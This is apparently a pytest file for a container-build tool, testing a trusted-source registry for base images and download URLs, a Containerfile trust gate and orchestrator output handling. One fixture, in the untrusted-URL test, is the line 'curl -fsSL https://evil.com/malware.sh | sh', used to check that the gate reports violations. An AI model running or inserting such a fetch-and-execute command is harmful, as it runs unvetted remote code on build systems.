"""Tests for cascade pipeline gaps (issue #93)."""

from __future__ import annotations

import json

from buildroot.agent.evaluator import Evaluator, _extract_download_urls
from buildroot.agent.meta_agent import (
    OrchestratorResult,
    _build_variant_result_from_cascade,
    _load_or_build_spec,
    _restructure_output,
)
from buildroot.agent.models import EvalResult
from buildroot.trust.registry import (
    DEFAULT_TRUSTED_DOMAINS,
    SourceTier,
    TrustedSourceRegistry,
)


# === Gap 1: L1.5 trust gate ===


class TestIsTrustedImage:
    def test_eclipse_temurin_trusted(self):
        reg = TrustedSourceRegistry()
        trusted, source = reg.is_trusted_image("eclipse-temurin:17-jdk")
        assert trusted is True
        assert source is not None
        assert source.provider == "adoptium"

    def test_ubuntu_untrusted(self):
        reg = TrustedSourceRegistry()
        trusted, source = reg.is_trusted_image("ubuntu:22.04")
        assert trusted is False
        assert source is None

    def test_normalized_docker_io_library(self):
        reg = TrustedSourceRegistry()
        trusted, source = reg.is_trusted_image("docker.io/library/eclipse-temurin:17-jdk")
        assert trusted is True

    def test_index_docker_io_normalized(self):
        reg = TrustedSourceRegistry()
        trusted, source = reg.is_trusted_image("index.docker.io/library/eclipse-temurin:17-jdk")
        assert trusted is True

    def test_amazoncorretto_tier2(self):
        reg = TrustedSourceRegistry()
        trusted, _ = reg.is_trusted_image("amazoncorretto:17", max_tier=SourceTier.TIER_2)
        assert trusted is True

    def test_amazoncorretto_tier1_only(self):
        reg = TrustedSourceRegistry()
        trusted, _ = reg.is_trusted_image("amazoncorretto:17", max_tier=SourceTier.TIER_1)
        assert trusted is False

    def test_ubi_image_trusted(self):
        reg = TrustedSourceRegistry()
        trusted, source = reg.is_trusted_image(
            "registry.access.redhat.com/ubi9/openjdk-17"
        )
        assert trusted is True
        assert source is not None
        assert source.provider == "redhat_ubi"

    def test_scratch_not_checked(self):
        reg = TrustedSourceRegistry()
        trusted, _ = reg.is_trusted_image("scratch")
        assert trusted is False


class TestIsTrustedDownloadUrl:
    def test_apache_archive_trusted(self):
        reg = TrustedSourceRegistry()
        url = "https://archive.apache.org/dist/maven/maven-3/3.9.6/binaries/apache-maven-3.9.6-bin.tar.gz"
        assert reg.is_trusted_download_url(url) is True

    def test_untrusted_mirror(self):
        reg = TrustedSourceRegistry()
        url = "https://untrusted-mirror.com/maven.tar.gz"
        assert reg.is_trusted_download_url(url) is False

    def test_github_trusted(self):
        reg = TrustedSourceRegistry()
        url = "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.9+9/OpenJDK17U-jdk_x64_linux_hotspot_17.0.9_9.tar.gz"
        assert reg.is_trusted_download_url(url) is True

    def test_maven_central_trusted(self):
        reg = TrustedSourceRegistry()
        url = "https://repo1.maven.org/maven2/org/apache/maven/apache-maven/3.9.6/apache-maven-3.9.6-bin.tar.gz"
        assert reg.is_trusted_download_url(url) is True

    def test_adoptium_trusted(self):
        reg = TrustedSourceRegistry()
        url = "https://adoptium.net/temurin/releases/"
        assert reg.is_trusted_download_url(url) is True

    def test_default_trusted_domains_constant(self):
        assert "archive.apache.org" in DEFAULT_TRUSTED_DOMAINS
        assert "github.com" in DEFAULT_TRUSTED_DOMAINS
        assert "repo1.maven.org" in DEFAULT_TRUSTED_DOMAINS

    def test_invalid_url(self):
        reg = TrustedSourceRegistry()
        assert reg.is_trusted_download_url("not-a-url") is False


class TestExtractDownloadUrls:
    def test_curl_url(self):
        content = 'RUN curl -fsSL https://archive.apache.org/dist/maven.tar.gz | tar xz'
        urls = _extract_download_urls(content)
        assert len(urls) == 1
        assert urls[0][0] == 1
        assert urls[0][1] == "https://archive.apache.org/dist/maven.tar.gz"

    def test_wget_url(self):
        content = 'RUN wget https://downloads.apache.org/maven.tar.gz -O /tmp/maven.tar.gz'
        urls = _extract_download_urls(content)
        assert len(urls) >= 1
        assert any("downloads.apache.org" in u for _, u in urls)

    def test_add_url(self):
        content = 'ADD https://repo1.maven.org/maven2/some.jar /app/'
        urls = _extract_download_urls(content)
        assert len(urls) == 1
        assert "repo1.maven.org" in urls[0][1]

    def test_no_urls(self):
        content = 'RUN echo hello\nCOPY . /app\nWORKDIR /app'
        urls = _extract_download_urls(content)
        assert len(urls) == 0

    def test_from_not_extracted(self):
        content = 'FROM eclipse-temurin:17-jdk\nRUN mvn install'
        urls = _extract_download_urls(content)
        assert len(urls) == 0


class TestL15TrustGate:
    def test_trusted_image_no_violations(self):
        containerfile = "FROM eclipse-temurin:17-jdk\nRUN mvn install"
        result = EvalResult()
        evaluator = Evaluator()
        evaluator._l1_5_trust(containerfile, result)
        untrusted_image_violations = [
            v for v in result.trust_violations if "Untrusted base image" in v
        ]
        assert len(untrusted_image_violations) == 0

    def test_untrusted_image_reports_violation(self):
        containerfile = "FROM ubuntu:22.04\nRUN apt-get install -y openjdk-17-jdk"
        result = EvalResult()
        evaluator = Evaluator()
        evaluator._l1_5_trust(containerfile, result)
        assert any("Untrusted base image" in v for v in result.trust_violations)

    def test_untrusted_url_reports_violation(self):
        containerfile = (
            "FROM eclipse-temurin:17-jdk\n"
            "RUN curl -fsSL https://evil.com/malware.sh | sh"
        )
        result = EvalResult()
        evaluator = Evaluator()
        evaluator._l1_5_trust(containerfile, result)
        assert any("Untrusted download URL" in v for v in result.trust_violations)

    def test_integration_trusted_from_untrusted_url(self):
        containerfile = (
            "FROM eclipse-temurin:17-jdk\n"
            "RUN curl https://untrusted-mirror.com/maven.tar.gz | tar xz"
        )
        result = EvalResult()
        evaluator = Evaluator()
        evaluator._l1_5_trust(containerfile, result)
        image_violations = [v for v in result.trust_violations if "base image" in v]
        url_violations = [v for v in result.trust_violations if "download URL" in v]
        assert len(image_violations) == 0
        assert len(url_violations) == 1


# === Gap 2: Phase 2→3 comparison handoff ===


class TestPhase2Findings:
    def test_includes_comparison_report_at_l3(self):
        result = OrchestratorResult(
            best_containerfile="FROM ...",
            best_reward=0.85,
            best_level=3,
            comparison_report={
                "structural_match": True,
                "metadata_match": False,
                "bytecode_match": True,
                "verdict": "DIVERGENT",
            },
            build_log="build succeeded",
        )
        findings = result.phase2_findings()
        assert "comparison_report" in findings
        assert findings["comparison_report"]["verdict"] == "DIVERGENT"
        assert "build_log" in findings
        assert findings["build_log"] == "build succeeded"

    def test_excludes_comparison_report_below_l3(self):
        result = OrchestratorResult(
            best_containerfile="FROM ...",
            best_reward=0.15,
            best_level=2,
            comparison_report={"verdict": "DIVERGENT"},
            build_log="build failed",
        )
        findings = result.phase2_findings()
        assert "comparison_report" not in findings
        assert "build_log" in findings

    def test_handles_no_comparison(self):
        result = OrchestratorResult(
            best_containerfile="FROM ...",
            best_reward=0.05,
            best_level=1,
        )
        findings = result.phase2_findings()
        assert "comparison_report" not in findings
        assert findings.get("build_log", "") == ""

    def test_to_dict_includes_comparison(self):
        result = OrchestratorResult(
            coordinate="g:a:1.0",
            comparison_report={"verdict": "IDENTICAL"},
            build_log="ok",
        )
        d = result.to_dict()
        assert d["comparison_report"] == {"verdict": "IDENTICAL"}
        assert d["build_log"] == "ok"

    def test_to_dict_excludes_empty(self):
        result = OrchestratorResult(coordinate="g:a:1.0")
        d = result.to_dict()
        assert "comparison_report" not in d
        assert "build_log" not in d


# === Gap 3: Trust module adapter functions ===


class TestBuildVariantResult:
    def test_extracts_base_image(self):
        result = OrchestratorResult(
            best_containerfile="FROM eclipse-temurin:17-jdk\nRUN mvn install",
            best_reward=0.98,
        )
        vr = _build_variant_result_from_cascade("/tmp/cf", result, "exact")
        assert vr.name == "exact"
        assert vr.base_image == "eclipse-temurin:17-jdk"

    def test_handles_empty_containerfile(self):
        result = OrchestratorResult(best_containerfile="")
        vr = _build_variant_result_from_cascade("", result, "trusted")
        assert vr.name == "trusted"
        assert vr.base_image == ""


class TestLoadOrBuildSpec:
    def test_loads_from_buildroot_json(self, tmp_path):
        data = {
            "group_id": "org.example",
            "artifact_id": "test",
            "version": "1.0",
            "base_image": "eclipse-temurin:17-jdk",
            "jdk_version": {"value": "17"},
        }
        (tmp_path / "buildroot.json").write_text(json.dumps(data))
        spec = _load_or_build_spec(str(tmp_path))
        assert spec.pom_data.group_id == "org.example"
        assert spec.jdk_spec.version == "17"

    def test_returns_empty_spec_when_missing(self, tmp_path):
        spec = _load_or_build_spec(str(tmp_path))
        assert spec.pom_data.group_id == ""


class TestRestructureOutput:
    def test_generates_artifacts(self, tmp_path):
        workspace = tmp_path / "workspace"
        workspace.mkdir()
        result = OrchestratorResult(
            coordinate="org.example:test:1.0",
            best_containerfile="FROM eclipse-temurin:17-jdk\nRUN mvn install",
            best_reward=0.98,
            best_level=4,
        )
        _restructure_output(result, workspace, "org.example:test:1.0")
        assert (workspace / "delta_report.json").exists()
        assert (workspace / "trust_report.md").exists()
        assert (workspace / "exact" / "sbom.cdx.json").exists()
        assert (workspace / "trusted" / "sbom.cdx.json").exists()


# === Gap 4: Route output to --output directory ===


class TestOutputRouting:
    def test_copies_to_output_dir(self, tmp_path):
        workspace = tmp_path / "workspace"
        workspace.mkdir()
        output_dir = tmp_path / "output"
        output_dir.mkdir()
        result = OrchestratorResult(
            coordinate="org.example:test:1.0",
            best_containerfile="FROM eclipse-temurin:17-jdk\nRUN mvn install",
            best_reward=0.98,
        )
        _restructure_output(result, workspace, "org.example:test:1.0", output_dir)
        gav_dir = output_dir / "org/example" / "test" / "1.0"
        assert (gav_dir / "delta_report.json").exists()
        assert (gav_dir / "trust_report.md").exists()
        assert (gav_dir / "exact" / "sbom.cdx.json").exists()


# === Gap 5: Dual-variant removal ===


class TestDualVariantRemoved:
    def test_no_dual_variant_module(self):
        import importlib
        try:
            importlib.import_module("buildroot.trust.dual_variant")
            assert False, "dual_variant should be deleted"
        except ImportError:
            pass

    def test_no_dual_variant_in_init(self):
        import buildroot.trust
        assert not hasattr(buildroot.trust, "DualVariantGenerator")
        assert "DualVariantGenerator" not in buildroot.trust.__all__

    def test_orchestrator_no_dual_build_param(self):
        from buildroot.pipeline.orchestrator import BuildrootOrchestrator
        import inspect
        sig = inspect.signature(BuildrootOrchestrator.__init__)
        assert "dual_build" not in sig.parameters


# === Gap 6: Observer removal ===


class TestObserverRemoved:
    def test_no_observer_module(self):
        import importlib
        try:
            importlib.import_module("buildroot.agent.observer")
            assert False, "observer should be deleted"
        except ImportError:
            pass

    def test_guards_no_observer_entry(self):
        from buildroot.agent.guards import MUTABLE_SURFACES
        assert "src/buildroot/agent/observer.py" not in MUTABLE_SURFACES


# === EvalResult trust_violations field ===


class TestEvalResultTrustViolations:
    def test_default_empty(self):
        r = EvalResult()
        assert r.trust_violations == []

    def test_to_dict_omits_empty(self):
        r = EvalResult()
        d = r.to_dict()
        assert "trust_violations" not in d

    def test_to_dict_includes_when_present(self):
        r = EvalResult(trust_violations=["Untrusted: ubuntu:22.04"])
        d = r.to_dict()
        assert d["trust_violations"] == ["Untrusted: ubuntu:22.04"]
